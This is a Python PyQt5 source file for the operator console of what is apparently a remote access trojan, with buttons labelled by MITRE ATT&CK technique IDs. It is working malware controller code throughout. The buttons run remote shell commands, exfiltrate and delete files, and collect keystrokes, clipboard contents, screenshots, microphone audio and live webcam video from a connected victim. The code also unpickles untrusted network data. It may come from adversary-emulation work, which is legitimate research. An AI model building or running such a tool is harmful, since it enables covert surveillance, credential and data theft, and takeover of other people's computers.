from datetime import datetime
import struct
import cv2
import pickle
from PyQt5.QtWidgets import (QLineEdit, QWidget, 
                             QPushButton, QToolTip, 
                             QLabel,)
from PyQt5.QtGui import QFont
from .connectionModule import (wait_for_connection, get_file_and_write,
                               send_string_into_connection, read_string_from_connection)


class Server(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
         
    def initUI(self):
        QToolTip.setFont(QFont('SansSerif', 10))
        self.setToolTip('Server')

        self.btn_T1082 = QPushButton('System Information', self)
        self.btn_T1082.clicked.connect(self.gather_system_info)
        self.btn_T1082.resize(self.btn_T1082.sizeHint())
        self.btn_T1082.move(50, 50)
        self.btn_T1059 = QPushButton('CMD', self)
        self.btn_T1059.clicked.connect(self.command_line_interface)
        self.btn_T1059.resize(self.btn_T1059.sizeHint())
        self.btn_T1059.move(50, 80)
        self.btn_T1083 = QPushButton('File And Directory Discovery', self)
        self.btn_T1083.clicked.connect(self.file_and_directory_discovery)
        self.btn_T1083.resize(self.btn_T1083.sizeHint())
        self.btn_T1083.move(50, 110)
        self.btn_T1105 = QPushButton('Remote File Copy', self)
        self.btn_T1105.clicked.connect(self.remote_file_copy)
        self.btn_T1105.resize(self.btn_T1105.sizeHint())
        self.btn_T1105.move(50, 140)
        self.btn_T1107 = QPushButton('File Deletion', self)
        self.btn_T1107.clicked.connect(self.file_deletion)
        self.btn_T1107.resize(self.btn_T1107.sizeHint())
        self.btn_T1107.move(50, 170)
        self.btn_T1057 = QPushButton('Process Discovery', self)
        self.btn_T1057.clicked.connect(self.process_discovery)
        self.btn_T1057.resize(self.btn_T1057.sizeHint())
        self.btn_T1057.move(50, 200)
        self.btn_T1056 = QPushButton('Input Capture', self)
        self.btn_T1056.clicked.connect(self.input_capture)
        self.btn_T1056.resize(self.btn_T1056.sizeHint())
        self.btn_T1056.move(50, 230)
        self.btn_T1115 = QPushButton('Clipboard Data', self)
        self.btn_T1115.clicked.connect(self.clipboard_data)
        self.btn_T1115.resize(self.btn_T1115.sizeHint())
        self.btn_T1115.move(50, 260)
        self.btn_T1113 = QPushButton('Screen Capture', self)
        self.btn_T1113.clicked.connect(self.screen_capture)
        self.btn_T1113.resize(self.btn_T1113.sizeHint())
        self.btn_T1113.move(50, 290)
        self.btn_T1123 = QPushButton('Audio Capture', self)
        self.btn_T1123.clicked.connect(self.audio_capture)
        self.btn_T1123.resize(self.btn_T1123.sizeHint())
        self.btn_T1123.move(50, 320)
        self.btn_T1125 = QPushButton('Video Capture', self)
        self.btn_T1125.clicked.connect(self.video_capture)
        self.btn_T1125.resize(self.btn_T1125.sizeHint())
        self.btn_T1125.move(50, 350)

        self.STOP = QPushButton('Stop', self)
        self.STOP.clicked.connect(self.stop)
        self.STOP.resize(self.STOP.sizeHint())
        self.STOP.move(50, 380)

        self.btn_Listen = QPushButton('Listen', self)
        self.btn_Listen.clicked.connect(self.establish_connection)
        self.btn_Listen.resize(self.btn_Listen.sizeHint())
        self.btn_Listen.move(250, 210)

        self.TextBox = QLineEdit(self)
        self.TextBox.move(250, 50)
        self.TextBox.resize(300, 150)
        self.TextBox.setText("Type here port to listen and press button 'Listen'")

        self.label = QLabel("There is would be your program feedback", self)
        self.label.move(250, 300)
        self.label.resize(300, 150)
        self.label.setWordWrap(False)

        self.setGeometry(300, 300, 800, 600)
        self.setWindowTitle('Server')
        self.show()

    def establish_connection(self):
        try:
            self.connection, self.address = wait_for_connection(int(self.TextBox.text()))
            self.label.setText(f"Got connection from {self.address[0]}:{self.address[1]}")
            self.operation_system = self.connection.recv(1).decode()
            self.label.setText(f"Os is: {self.operation_system}")
        except Exception as e:
            pass


    def gather_system_info(self):
        self.connection.send(b"1")
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "sys_info" + date + ".txt")
        self.label.setText("You have sysinfo in sysinfo.txt")
        
    def command_line_interface(self):
        self.connection.send(b"2")
        send_string_into_connection(self.connection, self.TextBox.text())
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "cmd_output_" + self.TextBox.text() + "_" + date + "_.txt")
        self.label.setText("You have cmd output in cmd_output_command_datetime.txt")
        self.label.resize(self.label.sizeHint())

    def file_and_directory_discovery(self):
        self.connection.send(b"3")
        date = str(datetime.now()).replace(":", "")
        filename = "FileAndDirectoryDiscovery" + date + ".txt"
        get_file_and_write(self.connection, filename)
        self.label.setText("You have an output in " + filename)
        self.label.resize(self.label.sizeHint())  

    def remote_file_copy(self):
        self.connection.send(b"4")
        filename = self.TextBox.text()
        send_string_into_connection(self.connection, filename)
        get_file_and_write(self.connection, filename.split("/")[-1])
        self.label.setText("success") 

    def file_deletion(self):
        self.connection.send(b"5")
        filename = self.TextBox.text()
        send_string_into_connection(self.connection, filename)
        self.label.setText("success") 

    def process_discovery(self):
        self.connection.send(b"6")
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "ProcessDiscovery_output" + date + ".txt")
        self.label.setText("You have an output in " + "ProcessDiscovery_output" + date + ".txt")
        self.label.resize(self.label.sizeHint())

    def input_capture(self):
        self.connection.send(b"7")
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "keylogger " + date + ".txt")
        self.label.setText("You have an output in " + "keylogger " + date + ".txt")
        self.label.resize(self.label.sizeHint())

    def clipboard_data(self):
        self.connection.send(b"8")
        res = read_string_from_connection(self.connection)
        self.label.setText(res)
        self.label.resize(self.label.sizeHint())

    def screen_capture(self):
        self.connection.send(b"9")
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "screenshot" + date + ".png")
        self.label.setText("You have an screenshot in " + "screenshot" + date + ".png")
        self.label.resize(self.label.sizeHint())

    def audio_capture(self):
        self.connection.send(b"A")
        seconds_to_record = str(self.TextBox.text())
        send_string_into_connection(self.connection, seconds_to_record)
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "AudioCapture_" + date + "_.wav")
        self.label.setText("You have audiocapture of " + str(seconds_to_record) + "seconds" +" in " + "record" + date + ".png")
        self.label.resize(self.label.sizeHint())

    def video_capture(self):
        self.connection.send(b"B")
        data = b''
        size = struct.calcsize("L")
        while True:
            self.connection.send(b"continue")
            while len(data) < size:
                data += self.connection.recv(4096)
            packed_msg_size = data[:size]
            data = data[size:]
            msg_size = struct.unpack("L", packed_msg_size)[0]
            while len(data) < msg_size:
                data += self.connection.recv(4096)
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame = pickle.loads(frame_data)
            cv2.imshow('frame', frame)
            if cv2.waitKey(1) & 0xFF == ord('x'):
                self.connection.send(b"stop")
                break
        cv2.destroyAllWindows()

    def stop(self):
        self.connection.send(b"S")